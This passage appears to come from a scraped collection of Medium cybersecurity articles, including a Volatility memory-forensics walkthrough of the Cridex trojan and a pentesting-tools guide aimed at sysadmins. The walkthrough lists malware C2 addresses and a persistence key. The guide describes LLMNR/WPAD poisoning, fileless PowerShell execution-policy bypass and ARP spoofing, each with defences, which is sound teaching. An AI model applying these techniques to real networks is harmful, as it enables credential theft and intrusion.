But perhaps the creepiest part of it all is the fact that Face ID and other facial recognition technologies operate in an “always on” manner. This means the technology is automatically activated as soon as it sees your face.
No buttons. No confirmations. Just your face.
Which means, in a weird and even more 1984-style way, it is always watching you through your front facing camera.
It’s constantly collecting live data that needs to be stored somewhere, which raises the ultimate privacy question: are we constantly being watched and who is watching us?
With data as sensitive as this, there’s always going to be growing pains. Over the next two years, the technology we know now might be completely extinct and something else entirely might have become a front runner in the facial recognition world.
But for now, all we know is that businesses that use facial recognition need to acknowledge how they capture data and what they use it for. At the moment, the best way for them to do this is to combine strong knowledge (which is something like a password; something you know) and inherence (which is something like facial recognition or an iris scan; something you are).
This two-factor security method will minimize the chance of hackers getting access to devices, but this starts right at the very beginning. For facial recognition to be completely effective as a security measure, it needs to be embedded from the development stage and a built-in part of the technology.
So, next time you see a camera, smile. You never know who might be watching.
Do you share our vision of making life easier for people WITHOUT compromising their privacy?
➞ Click the � below to CLAP for this piece.
➞ SHARE our story with people you think will benefit from it.
➞ Get the latest updates — FOLLOW our blog, Reddit, Facebook, or Twitter.
We’re working hard to bring you great content. If you have something you want us to write about, let us know in the comments below!
Written by: Lizzie Davey
Written by
","['Privacy', 'Data', 'Facial Recognition', 'Iphone X', 'Cybersecurity']"
FBI vs Apple: how did we get here? - Isaac Potoczny-Jones - Medium,https://medium.com/@SyntaxPolice/fbi-vs-apple-how-did-we-get-here-a46e8cf4e12e?source=tag_archive---------3-----------------------,"FBI vs Apple: how did we get here?
Apple and the FBI have been headlining recently in a debate about cryptography. Crypto is one of those fields that very few people actually understand well; it’s nuanced and complex, just like the current debate, and small mistakes can have big consequences.
I recently found myself picturing this debate in a series of over-simplified cartoons. I wonder if these can help illuminate a complex issue, even if just a little bit.
So let’s start with where we are today. Apple doesn’t want to help the FBI unlock the iPhone of a terrorist. Well, they do want to help, but they don’t want to help in the way the FBI wants them to help, which is to create a one-off backdoor, a version of their iOS where several vital security features are disabled. The FBI suddenly backed off of this request on Monday because they might have found another method of accessing the phone:
After a lot of public outcry and much debate, the FBI has said that “an outside party demonstrated to the FBI a possible method for unlocking [the] iPhone” and so they want to hold off on the hearings. As of today, we don’t know who the outside party is, but there have been some unconfirmed reports.
Apple has claimed all along that the FBI is trying to set a precedent having to do with surveillance over all Americans, not just warrants for a single device. To understand Apple’s concerns, we have to go back in time a bit to 2004, when the US government published an encryption-related algorithm with a serious security flaw that seemed to include a backdoor.
Most of the security community didn’t bother with the new algorithm, and in 2007, Microsoft security researchers realized it was deeply flawed because there could be a second key hidden somewhere:
Then in 2013, Edward Snowden claimed the algorithm was intentionally backdoored and that the US government did the backdooring.
This, coupled with other Snowden claims and advanced attacks by foreign governments, caused many tech companies, including Apple, to massively improve the security of their products over the last few years. Encryption is a core aspect of those improvements. The Snowden claims also created distrust between the security community and the government, and that is what we’re seeing play out in the Apple-vs-FBI case.
But wait a minute, where did those nice locks come from in the first place? The short answer is that the government and security people have been working together to make and break codes for quite some time. Many people trace the roots of modern cryptography to World War II, so if you’ll permit a brief interlude, that era is absolutely fascinating.
During the war, mechanical computers were used to make and break codes, and early computer scientists like Alan Turing were an important part of the war effort. This work eventually evolved into modern cryptography, but more importantly, it evolved into modern computers!
In the 1970s, several people, both inside and outside the government, independently invented some core aspects of modern cryptography that are still in use today. The team that created a very widely used algorithm (called RSA) created a company (called RSA) to commercialize it. This kind of “asymmetric” crypto was a major advancement in protecting everyone’s secrets.
Since that period, the US government has tried, with varying degrees of success, to limit access to encryption algorithms in order to maintain legal access for wire tapping. Sometimes it happened via export restrictions (some of which are still in place), sometimes via laws and standards that limit key size, and sometimes by giving the government a special access key:
Things came to a head when the government tried to create a hardware cryptography system called the Clipper chip that gave them a legal backdoor so they could maintain the ability to wire tap phone conversations. Like many backdoors, this one contained a serious vulnerability, and the security community and consumers rejected the premise and the implementation of the technology:
It’s worth noting that, back in the 90s, before the Patriot Act, the government had reduced surveillance powers due to public and congressional outcry over alleged abuses in the 1970s. Eventually, because of the rise of the Internet, encryption became vitally important to the US economy.
Since then, the relationship between the security community and the government has steadily improved, with the government continuing to participate in the creation and standardization of cryptographic algorithms that are largely the ones we use today as the foundation of cybersecurity:
Unfortunately, encryption technology has been extremely hard for normal people (and even developers!) to use, leading to a lack of adoption and enormous security vulnerabilities:
Cryptography was instrumental to getting the Internet widely adopted as a platform for buying and selling stuff, not to mention just communicating with one another. Before e-commerce could become a thing, developers had to find a way to transmit secure information over the Internet. Of course, we had these wonderful cryptographic security tools already developed, and eventually they were built into web browsers in way that most people can (sorta sometimes) manage to use securely:
As an aside, “hackers” have long played both sides of the fence in helping to point out weaknesses (white hat hackers) and also exploiting them (black hat hackers), and even testifying before Congress using their hacker nicknames. Eventually some of those same people would fill important positions in cybersecurity within the US Department of Defense.
In fact, around this era, cybersecurity was considered critical in the adoption of new communications technologies like health care data exchange, where the government actually mandates cybersecurity and encryption by law:
But the fact that crypto is so hard to use doesn’t just hurt consumer end users. The US government has also been the victim of attacks.
In 2002, Congress passed a law basically saying that government agencies need to use security, and the Office of Inspector General (OIG) released public reports over the years about security vulnerabilities at various agencies (2013, 2014). This includes the Office of Personnel Management (OPM), which holds sensitive information about people who have security clearance. Unfortunately, OPM didn’t have any professional security staff until 2013 and didn’t use two-factor authentication in many instances, including these really cool crypto “smart cards” that everyone in the government is supposed to use:
Eventually, the OPM got hacked, and extremely personal information about US clearance holders was taken, reportedly by the Chinese intelligence services:
This hack bolstered the arguments of those who are concerned that a government backdoor to crypto would be impossible to keep secret, that our enemies would use it against us.
In 2011, US Senator Ron Wyden claimed the Patriot Act was being used to justify widespread surveillance, but he couldn’t say much about it because it was classified:
Then came the 2013 Snowden claims about the mechanism of surveillance: accessing the computer networks of US technology companies. Some companies reacted by increasing the use of encryption and security.
Everyone knew that crypto was a good solution, but it had always been difficult to use, even for computer programmers, not to mention journalists who are trying very hard. At this point, the technical communities started getting a lot more interested in building much more robust cybersecurity into their systems:
Of course, Apple found a way to make its iOS extremely secure and shockingly easy to use so that even a somewhat bad password is robust against advanced attacks:
Since most people accept most “defaults,” making things secure by default is an important part of actually making things secure; but if everyone uses strong crypto all the time, it becomes very hard for law enforcement to get access to it.
Those surprisingly secure devices are widely adopted now, and although they probably weren’t originally introduced to thwart law enforcement, they are apparently having that effect. While anyone could have used strong encryption at any time since the 1970s, it wasn’t really practical for the average person until the last few years; so the issue isn’t really strong crypto, it’s easy-to-use crypto.
Since then, the public has been engaged in a lively debate about whether the government should have backdoors into crypto systems. In late 2015, the FBI said they wouldn’t seek a legislative solution, and President Obama echoed this.
New York and California introduced bills making encryption-by-default illegal, but it’s not clear those bills will go anywhere. The whole thing is starting to remind the security community of the “crypto wars” of the 1990s:
That pretty much brings us up to speed. The FBI and Apple are continuing their legal sparring, with the FBI making thinly veiled threats about solutions that would be even worse for Apple:
So while the FBI in 2016 is asking for access to a single device, the security and technical communities are weighing the historical context of the request.
Since World War II, if not earlier, cybersecurity has been an intricate dance between the code makers and the code breakers. There’s a lot of distrust, even though we all know we’re on the same team. The distrust engendered by the Snowden claims causes people to worry that the purpose of the request is actually about mass surveillance, not about one phone.
At the same time, law enforcement organizations know they need to get their jobs done, and it will be harder to perform investigations without the data that they have until recently been able to get from phones and back-end servers. Strong encryption makes “physical” evidence inaccessible in a way that it rarely, if ever, has been in the past.
The security vulnerabilities of the Clipper chip backdoor and the OPM hacks cause the security community to worry that the government won’t be able to protect a backdoor if it’s ever created.
Even with the best crypto money can buy, cybersecurity is not a solved problem; in fact, many companies are barely keeping ahead of the threats, as John Oliver obscenely expresses it. On top of that, some claim that adding backdoors will only make it harder to build secure systems because they increase the attack surface that security folks need to defend.
Isaac Potoczny-Jones is an authentication and privacy specialist. He is the CEO of Tozny, a security startup that offers two-factor authentication services. Follow Isaac on Twitter. Credit for the beautiful cartoons goes to Shpat Morina of Galois.
Written by
","['Cybersecurity', 'Cryptography']"
Financial Fraud: What to do if you’re a Victim - Paytm Blog,https://blog.paytm.com/notice-something-fishy-with-your-financial-accounts-report-it-to-the-cyber-cell-8ce8de6159f9?source=tag_archive---------7-----------------------,"Cyber crime covers a wide range of criminal activity ranging from malicious attacks like hacking, virus dissemination and software piracy to financial fraud like phishing, vishing and credit card fraud among others.
The government’s cyber-crime cells are the one stop solution towards combatting cyber-crime. These cyber cells are a part of the criminal investigation departments of cities and handle all Internet-related criminal cases under the Information Technology Act, 2000.
Please note: Kindly report possible cases of cyber-crime as soon as possible. Faster reporting often helps authorities effectively work towards recovering lost money.
Don’t see your city/state’s contact details on the map? Click here for the complete list of 22 Cyber Cells across India.
At Paytm, we have always given utmost importance to the security of the money you store in your Paytm Wallet. We have a dedicated team working round-the-clock with the police to provide them financial data to help nab cyber criminals.
In case of any security concerns regarding your Paytm account, give us a call at 0120 3888 3888 or report the issue at https://paytm.com/care/privacyandsecurity/ and we’ll get in touch instantly.
Written by
","['News', 'Help', 'Buzz', 'Security', 'Regional', 'Travel', 'Gold', 'Paytm Communities', 'Cybersecurity', 'Security', 'Paytm']"
First steps to volatile memory analysis - P4N4Rd1 - Medium,https://medium.com/@zemelusa/first-steps-to-volatile-memory-analysis-dcbd4d2d56a1?source=tag_archive---------5-----------------------,"Welcome to my very first blog post where we will do a basic volatile memory analysis of a malware. This post is intended for Forensic beginners or people willing to explore this field.
In this short tutorial, we will be using one of the most popular volatile memory software analyzer: Volatility. This tool will help us to inspect a volatile memory dump of a potentially infected computer. This software will help us to retrieve useful information (such as: the running processes, the last files modified or even the user’s browser history…) stored in the memory of the computer.
We will run several volatility commands in this tutorial using a simple case scenario: the Cridex malware, ready? Let’s begin!
The very first command to run during a volatile memory analysis is: imageinfo, it will help you to get more information about the memory dump
With -f specifying your dump file and imageinfo the volatility plugin you want to use. You should obtain the following result:
We now have the computer OS from which this memory dump comes from (WinXPSP2x86). The investigation can now begin, we can specify to volatility the OS profile (--profile=WinXPSP2x86) and try to find what happened on the victim’s computer.
Let’s see what were the running processes using the pslist plugin.
An alternative to the pslist plugin can be used to display the processes and their parent processes: pstree
At first glance we can notice an odd process named “reader_sl.exe” with the “explorer.exe” as parent process (PPID) which was one of the last processes running on the machine.
Let’s run a last command before investigating deeper into these two processes. psxview will list processes that are trying to hide themselves while running on the computer, this plugin can be really useful.
Well, except in our case ;) no processes seem to be hidden, if so you’ll see “False” in the first two columns (pslist and psscan).
Let’s get back to this investigation, after seeing the running processes, a good thing to do is to check the running sockets and open connections on the computer. To do this we’ll use these different plugins: connscan, netscan and sockets
The connscan plugin is a scanner for TCP connections, while sockets will print a list of open sockets and finally netscan (which cannot be used in our example due to the profile used) will scan a Vista (or later) image for connections and sockets.
In our scenario, two TCP connections are used by the process with PID 1484 (by looking at our command history outputs we can easily link the PID 1484 to the process explorer.exe). We can see that one of this TCP connection is still open, the one using port 1038 and communicating with the destination IP address 41.168.5.140.
Let’s now take a look at the last commands ran, by using cmdscan, consoles and cmdline plugins.
The first two plugins: consoles (which extracts command history by scanning for _CONSOLE_INFORMATION) and cmdscan (which extracts command history by scanning for _COMMAND_HISTORY) did not contain any information in their buffers.
However, the cmdline plugin which display process command-line arguments did give us interesting information. Indeed, we now have the full path of the processes launched with PID 1484 and 1640. The “Reader_sl.exe” process is getting more and more suspicious…
So far, we know that this process was launched by the explorer process, is supposed to be a classic Adobe reader application, however we observed a running connection towards an external IP used by this very same process…
Let’s not jump to conclusions too quickly and let’s take a look at the concerned executable and the analysis of this latter using respectively procdump and memdump by specifying the -p 1640 (its PID) and --dump-dir (the directory where we want to extract theses dumps).
The first file “executable.1640.exe” is a restitution of the executable “Reader_sl.exe” and the dump extracted “1640.dmp” represents the addressable memory of the process.
Then, a simple analysis of these files can be done by using the “strings” linux command, be patient usually the dumps contains lots of information. In our scenario, we are looking for a relation between the piece of information already retrieved from the dump (especially the opened tcp connection towards the 41.168.5.140 IP) and this 1640 process.
I used the grep command combined with the -C #NUMBER to get the previous and next lines, thus giving us more context for the information found. Here we can clearly see that the executable “Reader_sl.exe” is communicating towards the destination IP 41.168.5.140 using POST requests, potentially exfiltrating information from the victim’s computer.
By being patient enough and by reading the extracting dump using the strings command, we can find these interesting domains:
A list of Bank domain websites. By looking at the process memory we now have more reasons to be suspicious about “Reader_sl.exe”. Let’s now see if the executable is malicious or not.
We have two different possible ways of doing this at this point:
So let’s take the second option and analyze the files using VirusTotal, probably the most famous website for suspicious file and website analysis, I also like using: HybridAnalysis for this kind of analysis.
Clearly the executable is recognized as malicious by these two sandboxing websites with high detection scores!It is now time to sum up the different investigations we’ve made and our findings with the analyzed dump:
If the “cridex.vmem” dump was extracted from a user’s computer we could then conclude that the computer is infected by a trojan.
Let’s say this dump was found on an employee’s computer, who is working for a big company, as a Forensic investigator you’ve managed to analyze the volatile memory dump and found the malicious exe.
However, this executable might have been sent by a phishing campaign to all the company employees, so you now need to extract IOCs (Indicators of Compromise) to qualify this Cridex trojan as much as possible and thus help the SOC team to detect other potential infected computers.
The first IOC found in the dump was the C&C IP address: 41.168.5.140, to see if other IP addresses are used we can for example try and search in the process dump file for the following pattern “/zb/v_01_a/in/” which is the path queried by the malware (“41.168.5.140:8080/zb/v_01_a/in/”).
We found another IOC: 188.40.0.138! Let’s see if we can associate these IPs with possible hostnames using a passive DNS. For this case we’ll use a public passive DNS service named Mnemonic:
At this point we should then proceed and analyze each possible hostname to see if they could be linked to our trojan (time of the DNS record correspond to the time of the infection?, legitimate website? …). We would then give those IOCs to the SOC team for a proper detection of this trojan infection on the company’s infrastructure using custom SIEM detection rules.
If in fact this Cridex malware is found on other machines by the SOC team, you should either use an antivirus that can detect and eradicate the threat (using the anti-viruses that were able to detect our malicious executable) but also see if this malicious trojan is persistent or not.
Indeed, most malwares try to make their execution automatic at every system startup, hence making their deletion difficult. To see if this is the case with Cridex we can take a look at the registry entries used during the system startup.
These registry keys are stored in the following path: “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run, RunOnce, RunOnceEx” We can then use the volatility tool to navigate into hives and print the content of registry keys.
The hivelist plugin allow us to print the list of registry hives. The printkey plugin will help us to see the content of a registry key its subkeys and values. Let’s now use the -K option to navigate towards the registry key path we are looking for.
As you can see, the only hive that has been recently modified is the following registry “\Device\HarddiskVolume1\Documents and Settings\Robert\NTUSER.DAT”. Let’s confirm that the concerned executable named “KB00207877.exe” is linked with our trojan:
Since the executable is found in the memory dump of our trojan executable, we are now sure that Cridex modified the starting up registry key of the victim’s computer to make itself persistent. Deleting this “KB00207877.exe” is needed to make a good cleanup of the infected machine.
This is the end of this basic Cridex malware analysis. I hope you liked this blog post! Below, is a short sum up of the different Volatility commands used to analyze this dump:
You should now be able to “flag” (resolved) basic Forensics challs especially these following ones (found on the famous RootMe platform):
Have fun! :)
Written by
","['here', 'VirusTotal', 'Hybrid-Analysis', 'Mnemonic PassiveDNS', 'Tech', 'Hacking', 'Cybersecurity', 'Tutorial', 'Forensics']"
Five Pentesting Tools and Techniques (That Every Sysadmin Should Know),https://medium.com/@jeremy.trinka/five-pentesting-tools-and-techniques-that-sysadmins-should-know-about-4ceca1488bff?source=tag_archive---------0-----------------------,"Step into the mind of a pentester.
It’s Friday afternoon, somewhere around 2PM. The sound of whirring laptops is drowned out by your earbuds blasting the most aggressive music you have synced to your smartphone. That hash you captured hasn’t cracked, and your machine has been running since early Tuesday. The second energy drink you pounded down this afternoon hits the rim of the trashcan. The sterile business casual attire you’re being forced to wear is becoming noticeably less breathable as the frustration builds inside of you. It’s a couple of hours away from time to wrap up the engagement and provide the client with a verbal overview of your findings, but you don’t want to step into the office without capturing that flag.
Take a deep breath. It’s time to zoom out, get back to basics, and re-assess the environment.
In the days of Backtrack and early Kali Linux, the default wallpaper had the slogan “The quieter you become, the more you will be able to hear”, which you would quickly change to something less conspicuous in case anyone saw you playing around. It wasn’t until I was professionally penetration testing that I truly understood the wisdom of that statement. Technology is pulsing all around you, and in the short amount of time that you are hosted in this alien network you must try to understand its inner workings. Fortunately (or unfortunately), most network and system administrators are creatures of habit. All you have to do is listen for long enough, and more often than not it will yield some of those juicy findings.
Regardless of any discussion beforehand, a penetration test has a competitive feel from both sides. Consulting pentesters want their flag, and administrators want their clean bill of health to show that they are resilient to cyber-attack; something akin to a beer-league game of flag football. Everyone is having a great time together at the bar after the game, but the desire to “win” is undoubtedly present beforehand. The difference here is that in flag football, both teams are familiar with the tools used to play the game.
It goes without saying that a pentester’s job is to simulate a legitimate threat (safely, of course) to effectively determine your organization’s risk, but how can remediation happen without at least some familiarity? Sun Tzu once said,
“If you know neither the enemy nor yourself, you will succumb in every battle.”
In order to truly secure our networks, any administrator with cybersecurity duties will need to not only understand what they themselves have, but also step into the shoes of the opposite side (if at least on an informational level). Staying in the dark is not an advisable option.
To be clear, this article’s intention is to focus on the ‘why’ and not completely the ‘how’. There are countless videos and tutorials out there to explain how to use the tools, and much more information than can be laid out in one blog post. Additionally, I acknowledge that other testers out there may have an alternate opinion on these tools, and which are the most useful. This list is not conclusive. If you have a different opinion than that which is described in the article, I would love to hear it and potentially post about it in the future! Feel free to comment below, or shoot me an email, tweet, whatever. I am pretty receptive to feedback.
With that being said, let’s get into the list.
This tool, in my opinion, makes the absolute top of the list. When an auditor comes in and talks about “least functionality”, this is what comes immediately to mind. If you are a pentester, Responder is likely the first tool you will start running as soon as you get your Linux distro-of-choice connected to the network and kick off the internal penetration test. Why is it so valuable, you might ask? The tool functions by listening for and poisoning responses from the following protocols:
There is more to Responder, but I will only focus on these three protocols for this article.
As a sysadmin, these protocols may be vaguely familiar, but you can’t quite recall from where. You may have seen them referenced in a Microsoft training book that has long since become irrelevant, or depending how long you have been in the game remember actually making use of one or them.
NBT-NS is a remnant of the past; a protocol which has been left enabled by Microsoft for legacy/compatibility reasons to allow applications which relied on NetBIOS to operate over TCP/IP networks. LLMNR is a protocol designed similarly to DNS, and relies on multicast and peer-to-peer communications for name resolution. It came from the Vista era, and we all know nothing good came from that time-frame. You probably don’t even use either of these, but under the hood they are spraying packets all across your network. Attackers (real or simulated) know this, and use it to their advantage.
WPAD on the other hand serves a very real and noticeable purpose on the network. Most enterprise networks use a proxy auto-config (PAC) file to control how hosts get out to the Internet, and WPAD makes that relatively easy. The machines broadcast out into the network looking for a WPAD file, and receive the PAC which is given. This is where the poisoning happens.
People in cybersecurity are aware that most protocols which rely on any form of broadcasting and multicasting are ripe for exploitation. One of the best cases here from an attacker’s perspective is to snag credentials off the network by cracking hashes taken from the handshakes these protocols initiate (or replaying them).
Sysadmins are more inclined to focus on whether or not the system works before getting dragged off to another task on a never-ending list of things to do. Fortunately for the overwhelmed, the mitigations are straightforward, and revolve around disabling the protocols. Use safer methods to propagate your web proxy’s PAC file location, like through Group Policy. I know it is tempting to “Automatically detect settings”, but try to avoid it. Test thoroughly in the event you are still supporting that NT Server from the 90s hosting that mission critical application though… Just kidding, no one is hosting an NT server nowadays…right?
Before Empire hit the scene, pentesters typically relied on Command and Control (C2) infrastructure where the agent first had to reside on-disk, which naturally would get uploaded to Virus Total upon public release and be included in the next morning’s antivirus definitions. Of course ways to get around antivirus existed, but it was always an extra step, and any solution that leveraged any kind of behavior based detection would give you extra headaches. The time spent evading detection was a seemingly never-ending cat-and-mouse game. It was at that moment brilliant white knight(s) crossed the horizon, and said “let there be file-less agents!”. And just like that, the game was changed.
It was as if the collective unconscious of pentesters everywhere came to the realization that the most powerful tool at their disposal was already present on most modern workstations around the world. A framework had to be built, and the Empire team made it so.
All theatrics aside, the focus on pentesting frameworks and attack tools have undoubtedly shifted towards PowerShell for exploitation and post-exploitation. Not only penetration testers, but also real attackers, who are interested in the file-less approach due to its high success rate.
Sysadmins, what does this mean for you? Well, it means that some of the security controls you have put in place may be easily bypassed. File-less agents (including malware) can be deployed by PowerShell and exist in memory without ever touching your hard disk or by connecting a USB (although this mode of entry is still available, as I will explain later). More and more malware exists solely in memory rather than being launched from an executable sitting on your hard disk. A write-up mentioned at the end of this post elaborates much further into this topic. Existing in memory makes antivirus whose core function is scanning disk significantly less effective. This puts the focus instead on attempting to catch the initial infection vector (Word/Excel files with macros very commonly), which can be ever-changing.
Fortunately, the best mitigation here is something you may already have access to — Microsoft’s Applocker (or the application whitelisting tool of your choice). Granted, whitelisting can take some time to stand up properly and likely requires executive sign-off, but it is the direction endpoint security is heading. This is a good opportunity to get ahead of the curve. I would ask that you also think about how you use PowerShell in your environment. Can normal users launch PowerShell? If so, why?
When it comes to mitigation, let me save you the effort; the execution policy restrictions in PowerShell are trivial to bypass (see the “-ExecutionPolicy Bypass” flag).
This combo right here is an absolute staple. Cracking hashes and recovering passwords is pretty straightforward of a topic at a high level, so I won’t spend a whole lot of time on it.
Hashcat is a GPU-focused powerhouse of a hash cracker which supports a huge variety of formats, typically used in conjunction with hashes captured by Responder. In addition to Hashcat, a USB hard drive with several gigs of wordlists is a must. On every pentest I have been on, time had to be allocated appropriately to maximize results, and provide the most value to the client. This made the use of wordlists vital versus other methods. It is always true that given enough time and resources any hash can be cracked, but keep things realistic.
Pentesters, if you are going in with just one laptop, you are doing it wrong. Petition for a second one; something beefy with a nice GPU that has some heft to it.
Sysadmins, think about your baseline policies and configurations. Do you align with one? Typically it is best practice to align with an industry standard, such as the infamous DISA STIG, as closely as possible. Baselines such as DISA STIG support numerous operating systems and software, and contain some key configurations to help you prevent against offline password cracking and replay attacks. This includes enforcing NIST recommended password policies, non-default authentication enhancements, and much more. DISA even does the courtesy of providing you with pre-built Group Policy templates that can be imported and custom-tailored to your organization’s needs, which cuts out much of the work of importing the settings (with the exception of testing). Do you still use NTLMv1 on your network? Do you have a password requirement of 8 or less characters? Know that you are especially vulnerable.
To the pentesters out there, I am likely preaching to the choir. To everyone else, it is important to note that a web penetration testing tool is not the same as a vulnerability scanner.
Web-focused tools absolutely have scanning capabilities to them, and focus on the application layer of a website versus the service or protocol level. Granted, vulnerability scanners (Nessus, Nexpose, Retina, etc) do have web application scanning capabilities, though I have observed that it is best to keep the two separate. Use a web-based tool for testing your intranet or extranet page, and let the vulnerability scanners keep doing their blanket assessments on your ports, protocols, and services.
That being said, let’s examine what we are trying to identify. Many organizations nowadays build in-house web apps, intranet sites, and reporting systems in the form of web applications. Typically the assumption is that since the site is internal it does not need to be run through the security code review process, and gets published out for all personnel to see and use. With a focus on publishing the code versus making sure it is safe and secure, vulnerabilities present themselves that may be ripe for exploitation.
Personally, my process during a pentest would begin with attempting to find low hanging fruit with misconfigured services or unpatched hosts on the network. If that failed to get a significant finding, it was time to switch it up and move to the web applications. The surface area of most websites leaves a lot of room for play to find something especially compromising. Some of my favorites for demonstrating major issues are:
If you administer an organization that builds or maintains any internal web applications, think about whether or not that code is being reviewed frequently. Code reuse becomes an issue where source code is imported from unknown origins, and any security flaws or potentially malicious functions come with it. Furthermore, the “Always Be Shipping” methodology which has overtaken software development as of late puts all of the emphasis on getting functional code despite the fact that flaws may exist.
Acquaint yourself with OWASP, whose entire focus is on secure application development. Get familiar with the development team’s Software Development Lifecycle (SDLC) and see if security testing is a part of it. OWASP has some tips to help you make recommendations.
Understand the two methodologies for testing applications, including:
Additionally you will want to take the time to consider your web applications as separate from typical vulnerability scans. Tools (open and closed source) exist out there, including Burp Suite Pro, OWASP Zed Attack Proxy (ZAP), Acunetix, or Trustwave, with scanning functionality that will crawl and simulate attacks against your web applications. Scan your web apps at least quarterly.
When I mentioned “get back to basics” at the beginning of the article, this combination of tools exemplifies what I am talking about.
Arpspoof is a tool that allows you to insert yourself between a target and its gateway, and Wireshark allows you to capture packets from an interface for analysis. You redirect the traffic from an arbitrary target, such as an employee’s workstation during a pentest, and snoop on it. Sometimes just creeping on communications and seeing what they are reaching out to was enough to capture some cleartext data which would blow the whole test wide open.
Likely the first theoretical attack presented to those in cybersecurity, the infamous Man-in-the-Middle (MitM) attack is still effective on modern networks. Considering most of the world still leans on IPv4 for internal networking (and likely will for a good long while), and the way that the Address Resolution Protocol (ARP) has been designed, a traditional MitM attack is still quite relevant.
Many falsely assume that because communications occur inside their own networks, they are safe from being snooped on by an adversary and therefore do not have to take the performance hit of encrypting all communications in their own subnets. Granted, your network is an enclave of sorts from the wild west of the Internet, and an attacker would first have to get into your network to stand between communications.
In that same notion, let’s assume that a workstation is compromised by an attacker in another country using a RAT equipped with tools that allow a MitM to take place. Alternately (and possibly more realistically), consider the insider threat. What if that semi-technical employee with a poor attitude got to watching script-kiddie tutorials on YouTube, and wanted to creep on that receptionist that they suddenly became unusually fond of? The insider threat scenario is especially present if your organization’s executives are well-known and very wealthy. Never forget that envy makes people do stupid and reckless things.
Now, let’s talk about defense. Encrypt your communications. Yes, internally as well. Never assume communications inside your network are safe just because there is a gateway device separating you from the Internet. All client/server software should be encrypting their communication, period.
Keep your VLAN segments carefully tailored, and protect your network from unauthenticated devices. Implementing a Network Access Control (NAC) system is something you may want to add to your security roadmap in the near future, or implementing 802.1X on your network may be a good idea. Shut down those unused ports, and think about sticky MACs if you are on a budget.
Did the idea of testing out an IDS system ever pique your interest? It just so happens that there are open source options available, including Security Onion, to test and demonstrate effectiveness. IDS rules are focused on identifying anomalous network activity that may indicate an attempted ARP poisoning attack. Give it a whirl if you have a spare box laying around, and approval of course. Honeypot systems may be a great idea for a trial run, to which there are a number of open source options available. Take a look at Honeyd.
I have included this last one as an honorable mention for the simple fact that it doesn’t fall completely in-line with the rest of the tools above, but has time and time again proven to be useful enough in making ground during an external penetration test. If you spend any time over at r/netsec, you more than likely have seen an influx of subdomain brute-forcers and enumerators being linked as of late.
Why all the hype?
To anyone attempting to get into your network, good or bad, reconnaissance is 80% of the legwork, and the first step usually starts with enumeration of your subdomains. An attacker doesn’t necessarily even need to touch your systems to see what you have facing the web, and tools like Fierce make it easy.
Sysadmins, if I were to ask you what your exposure is to the Internet, would you be able to tell me? What ports and protocols do you have forwarded out to the wild? What web consoles are exposed for anyone to see? Run a WHOIS lookup on your organization’s primary web domain at a popular registrar (Network Solutions, GoDaddy, etc). Whose name, address, and email do you see listed? Hopefully it’s Mr. Perfect Privacy, otherwise that person is going to become a target to adversaries. Shodan has even made a business exposing these devices to the world. Take your external IP addresses and plug them into the search engine, and see what everyone else can see.
Here’s an example. If you are a sysadmin and do not recognize the name Phineas Fisher, I wouldn’t be surprised. If you are a pentester, shame…
In 2016, the firm “Hacking Team” based out of Milan, Italy, was known for designing cyber-weapons for governments across the globe. They were notoriously hacked by an unknown attacker with this pseudonym. The end result was the leakage of a huge volume of data, and quite possibly one of the most comprehensive write-ups on a real-life hack ever created. The point here is, take a look at Step 2 of his write-up. “Subdomain Enumeration”. I won’t comment about the ethics of the event, but regardless of where you stand on it, the details Phineas Fisher has provided have incredible value for security researchers and system administrators alike to step into the mind of an attacker.
Just remember, Sun Tzu also famously said,
“If you know the enemy and know yourself, you need not fear the result of a hundred battles.”
I will leave this one up for your interpretation.
Thanks for reading! My goal is to help individuals and organizations tackle complex cybersecurity challenges, and bridge policy into operations. Comments or critiques? Reach me on LinkedIn , Twitter, email — jeremy.trinka[at]gmail[dot]com, or reply below.
Written by
","['SQL Injection', 'Authentication bypass', 'Cybersecurity', 'Sysadmin', 'Penetration Testing', 'It Operations']"
Forensic Report Raises Questions about Australian Tax Office’s Handling of Craig Wright Probe,https://medium.com/@Bitcoin_Beyond/forensic-report-raises-questions-about-australian-tax-offices-handling-of-craig-wright-probe-138843251ef5?source=tag_archive---------5-----------------------,"We recently took the time to lay out a factual timeline of Craig Wright’s involvement with Bitcoin using publicly available information. While the list is not exhaustive, the bulk of information comes starting in 2014 as everything prior to that date has been scrubbed from the internet. When digging in to try and fill in the gaps between 2009–2013, you find a long and bitter battle between Wright and the Australian Tax Office. The BBC first asked Wright about his dealings with the ATO in his famous interview around May 2016. Here is his response:
I have companies that are under audit. The reason for that is that we have told the ATO everything. We have told them about the tax issues and implications. We actually put in everything with the auditors… We had an internal audit and we supplied that to the tax office so that we could pay the correct amount of tax. And because no one really understands Bitcoin very well, and no one understands the timing or anything like that, then it’s still an ongoing matter.
While many news organizations have used Wright’s dealings with the ATO to make accusations of “fraud”, an examination of the facts and evidence paints a different story. We have obtained private documents that contradict the prevailing narratives about Wright’s history and dealings with the Australian Tax Office:
As part of Wired/Gizmodo’s initial doxxing of Craig Wright, a leaked 2014 transcript between the Australian Tax Office and Craig Wright and his legal team gave us a glimpse into the long saga between Craig Wright’s various business dealings and the ATO. This document is authentic and is cited as evidence in the current lawsuit between Ira Kleiman and Craig Wright. In this transcript we are given some key insight into the various audits Craig Wright’s companies underwent as a result of his Bitcoin businesses dating back to 2009. Two days prior to the date of the transcript, Investor Daily reported that Wright was working with the ATO to “have a full banking licence from APRA based on Bitcoin” with his company Hotwire PE. The transcript shows that this was not Wright’s first experience with the Australian Tax Office surrounding his Bitcoin businesses, and specifically that he “gained a little bit of paranoia” from his prior experience with the ATO “in 2010 or whatever it was”:
In working to obtain information about this previous interaction, we have obtained exclusive documents showing Wright’s initial 2011 objection decision against an amended assessment for the tax year ending 30 June 2009. The audit for the 2008–2009 income tax year was commenced on 10 February 2010.
The document details that Wright “purportedly sold [his] personal intellectual property to Information Defense and Integyrs”, two of Wright’s companies.
Information Defense was created on 29 January 2009, 19 days after the mining of the first Bitcoin block, and the domain information-defense.com was registered on 23 January 2009. The domain for Integyrs.com was registered on 25 April 2009.
It’s noteworthy that Wright’s initial tax return claimed a net capital gains upon which he would have owed taxes — refuting many claims that Wright was trying to get money out of the Australian Tax Office. After audit, the ATO took up issues with Wright’s claimed deductions to which he filed an objection. While the objection was initially disallowed, the objection decision was later reversed (as shown in another document dated 11 February 2013) and the deductions were finally granted to Wright. It is noted that “the Tribunal is requested to note that this decision is in favour of the Applicant”:
